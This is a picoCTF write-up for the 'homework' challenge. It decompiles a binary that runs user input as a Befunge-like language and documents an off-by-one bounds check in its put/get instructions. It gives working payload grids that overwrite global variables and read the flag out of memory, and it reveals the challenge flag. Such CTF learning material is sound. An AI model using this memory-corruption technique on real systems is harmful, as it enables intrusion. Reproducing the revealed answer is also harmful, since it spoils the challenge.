
# homework

*Hard*

>### Description
>"time to do some [homework](./homework)!"\
>`nc mars.picoctf.net 31689`

### Solution

When connecting to the server you get a message: "Enter homework sol". But I have no idea what to do. So lets decompile the binary to find out what it is doing, using **Ghidra**.

We find this main function:
```c
undefined8 main(void)

{
  int iVar1;
  FILE *__stream;
  size_t sVar2;
  char *pcVar3;
  int local_14;
  
  setvbuf(stdout,(char *)0x0,2,0);
  __stream = fopen("flag.txt","r");
  __isoc99_fscanf(__stream,&DAT_00103217,flag);
  fclose(__stream);
  puts("Enter homework sol");
  rows = 0x32;
  cols = 0x16;
  for (local_14 = 0; local_14 < 4; local_14 = local_14 + 1) {
    pcVar3 = fgets(board + (long)local_14 * 0x16,cols + 1,stdin);
    if ((pcVar3 == (char *)0x0) || (board[(long)local_14 * 0x16] == 'R')) break;
    sVar2 = strlen(board + (long)local_14 * 0x16);
    *(undefined *)((long)local_14 * 0x16 + sVar2 + 0x10525f) = 0;
  }
  do {
    iVar1 = step();
  } while (iVar1 != 0);
  do_you_like_gittens = 1;
  does_gittens_watch_cat_videos = 1;
  return 0;
}
```

This reads the flag.txt to &DAT_00103217, and it asks for user input that consists of 4 rows and 22 characters per row (22 cols). It seems like it stops taking input when you input an 'R' on a new row. 

Afterwards it processes the user input with the `step()` function, lets look at it:

(It has a lot of assertion checks to check if you are going out of bound of the inputted board or something, so I shortened those.)

```c
undefined8 step(void)

{
  long lVar1;
  
  switch(board[(long)pcy * 0x16 + (long)pcx]) {
  case 0x21:
    if () {assert}
    *(uint *)(stack + (long)(sn + -1) * 4) = (uint)(*(int *)(stack + (long)(sn + -1) * 4) == 0);
    break;
  default:
    if (board[(long)pcy * 0x16 + (long)pcx] == '0') {
      if () {assert}
      lVar1 = (long)sn;
      sn = sn + 1;
      *(undefined4 *)(stack + lVar1 * 4) = 0;
    }
    break;
  case 0x24:
    if () {assert}
    sn = sn + -1;
    break;
  case 0x25:
    if () {assert}
    *(int *)(stack + (long)(sn + -2) * 4) =
         *(int *)(stack + (long)(sn + -2) * 4) % *(int *)(stack + (long)(sn + -1) * 4);
    sn = sn + -1;
    break;
  case 0x2a:
    if () {assert}
    *(int *)(stack + (long)(sn + -2) * 4) =
         *(int *)(stack + (long)(sn + -1) * 4) * *(int *)(stack + (long)(sn + -2) * 4);
    sn = sn + -1;
    break;
  case 0x2b:
    if () {assert}
    *(int *)(stack + (long)(sn + -2) * 4) =
         *(int *)(stack + (long)(sn + -2) * 4) + *(int *)(stack + (long)(sn + -1) * 4);
    sn = sn + -1;
    break;
  case 0x2c:
    if () {assert}
    sn = sn + -1;
    putchar(*(int *)(stack + (long)sn * 4));
    break;
  case 0x2d:
    if () {assert}
    *(int *)(stack + (long)(sn + -2) * 4) =
         *(int *)(stack + (long)(sn + -2) * 4) - *(int *)(stack + (long)(sn + -1) * 4);
    sn = sn + -1;
    break;
  case 0x2e:
    if () {assert}
    sn = sn + -1;
    printf("%d",(ulong)*(uint *)(stack + (long)sn * 4));
    break;
  case 0x2f:
    if () {assert}
    *(int *)(stack + (long)(sn + -2) * 4) =
         *(int *)(stack + (long)(sn + -2) * 4) / *(int *)(stack + (long)(sn + -1) * 4);
    sn = sn + -1;
    break;
  case 0x3a:
    if () {assert}
    *(undefined4 *)(stack + (long)sn * 4) = *(undefined4 *)(stack + (long)(sn + -1) * 4);
    sn = sn + 1;
    break;
  case 0x3c:
    dirx = -1;
    diry = 0;
    break;
  case 0x3e:
    dirx = 1;
    diry = 0;
    break;
  case 0x40:
    return 0;
  case 0x5c:
    if () {assert}
    *(uint *)(stack + (long)(sn + -1) * 4) =
         *(uint *)(stack + (long)(sn + -1) * 4) ^ *(uint *)(stack + (long)(sn + -2) * 4);
    *(uint *)(stack + (long)(sn + -2) * 4) =
         *(uint *)(stack + (long)(sn + -2) * 4) ^ *(uint *)(stack + (long)(sn + -1) * 4);
    *(uint *)(stack + (long)(sn + -1) * 4) =
         *(uint *)(stack + (long)(sn + -1) * 4) ^ *(uint *)(stack + (long)(sn + -2) * 4);
    break;
  case 0x5e:
    dirx = 0;
    diry = -1;
    break;
  case 0x5f:
    if () {assert}
    sn = sn + -1;
    if (*(int *)(stack + (long)sn * 4) == 0) {
      dirx = 1;
      diry = 0;
    }
    else {
      dirx = -1;
      diry = 0;
    }
    break;
  case 0x60:
    if () {assert}
    *(uint *)(stack + (long)(sn + -2) * 4) =
         (uint)(*(int *)(stack + (long)(sn + -1) * 4) < *(int *)(stack + (long)(sn + -2) * 4));
    break;
  case 0x67:
    if () {assert}
    *(int *)(stack + (long)(sn + -2) * 4) =
         (int)(char)board[(long)*(int *)(stack + (long)(sn + -1) * 4) * 0x16 +
                          (long)*(int *)(stack + (long)(sn + -2) * 4)];
    sn = sn + -1;
    break;
  case 0x70:
    if () {assert}
    board[(long)*(int *)(stack + (long)(sn + -1) * 4) * 0x16 +
          (long)*(int *)(stack + (long)(sn + -2) * 4)] =
         (char)*(undefined4 *)(stack + (long)(sn + -3) * 4);
    sn = sn + -3;
    break;
  case 0x76:
    dirx = 0;
    diry = 1;
    break;
  case 0x7c:
    if () {assert}
    sn = sn + -1;
    if (*(int *)(stack + (long)sn * 4) == 0) {
      dirx = 0;
      diry = 1;
    }
    else {
      dirx = 0;
      diry = -1;
    }
  }
  pcy = (pcy + diry + rows) % rows;
  pcx = (pcx + dirx + cols) % cols;
  return 1;
}
```

We find that the input grid (board) we give will be processed as some kind of coding language. And there is some value "sn" which is a sort of stack pointer. These are all the important characters, and their meaning:

(At beginning of executing "sn"/"stack pointer" points to nothing)

>Basic stack interaction:
- 0: Way to increment the "sn" value. And set stack to 0. (Create new stack)
- $: Just decrement "sn" value.
- :: Copy stack value to next stack value. Increment "sn".
- \\: Swap stack value and stack-1 value.

>Execution direction changes:
- \>: Change exec direction to the right.
- <: Change exec direction to the left.
- v: Change exec direction to down.
- ^: Change exec direction to up.
- _: If stack value == 0 -> exec direction to the right, else, to the left. Decrement "sn".
- |: If stack value == 0 -> exec direction to down, else, to up. Decrement "sn".

>Output:
- .: Print int from stack. Decrement "sn".
- ,: Print char from stack. Decrement "sn".

>Operators on stack:
- !: Invert stack value to {0, 1}.
- %: Stack-1 value %= stack value. Decrement "sn".
- *: Stack-1 value *= stack value. Decrement "sn".
- +: Stack-1 value += stack value. Decrement "sn".
- -: Stack-1 value -= stack value. Decrement "sn".
- /: Stack-1 value /= stack value. Decrement "sn".
- `: Stack-1 value = (stack value < (less than) stack-1 value).

>Board interaction:
- g: Stack-1 value = board[row = stack value, col = stack-1 value]. Decrement "sn".
- p: Board[row = stack value, col = stack-1 value] = stack-2 value. Decrease "sn" by 3.

>End:
- @: Return 0. END.

_______\_

Every instruction has memory over/underflow checks. BUT the overflow check of the board for p(put) and g(get) instruction is faulty:

```c
...
    if ((rows < *(int *)(stack + (long)(sn + -1) * 4)) ||
       (cols < *(int *)(stack + (long)(sn + -2) * 4))) {
                    /* WARNING: Subroutine does not return */
      __assert_fail("stack[sn-1] <= rows && stack[sn-2] <= cols","homework.c",0x74,
                    (char *)&__PRETTY_FUNCTION__.0);
    }
...
```

We should be able to have row = 0x32 and col = 0x16, and this wouldn't assert fail. This comes down to an offset of: 0x32*0x16 + 0x16 = 0x462. 

Since we know the memory layout, it is something like this:
```
0x001050a0:     sn
0x001050c0:     stack
0x00105260:     board
0x001056ac:     rows
0x001056b0:     cols
0x001056b4:     diry
0x001056b8:     pcx
0x001056bc:     pcy
0x001056c0:     do_you_like_gittens
0x001056c4:     does_gittens_watch_cat_videos
0x001056e0:     flag
```

Offset between board and flag is 0x001056e0 - 0x00105260 = 0x480. 

The board instructions can overflow to 0x00105260 + 0x462 = 0x001056C2. We cannot read the flag yet. But we can overwrite the "rows" and "cols" variables to get an even bigger overflow that will allow us to read the flag.

The user input code cannot be on one line, each line can only be 21 characters long because the program does modulo 0x16. And you must guide the execution flow with '<','>','v','^'. 

This payload changes the rows variable to 0x50:
```
0!:+:*:*::::++++00!:v
@@@@@@@@p+++::*:*::+<
```

This allows us to overflow into the memory where flag is stored and read it. Write code that loops character-by-character and prints it to the terminal.

During the making of this code I used the constant 0x32 quite a lot so I started my code with a '2' (0x32), and I could easily access this with "00g", which gets the first character of my input. 

Eventually I came up with this code:

```
200g:+000gp00g:+0!>>v
v<<:+:*:+:!0pg00*:+:<
>00g0!:++g,>>>>>>>>>v
^<<<<<<<<<<<<<<<:+!0<
```

First it sets the "rows" and "cols" variables to 100, so we have some room to play with. Then it reads the first flag character, while saving the column value. Now the bottom loop increases, and saves, the column value each iteration. Each iteration it reads the corresponding character of the flag, up to 92 characters.

Now run this on the remote server.

<details>
<summary>Yes! We got the flag:</summary> 
picoCTF{good_job_full_score_X7OIj4HI903RG2YO}
</details>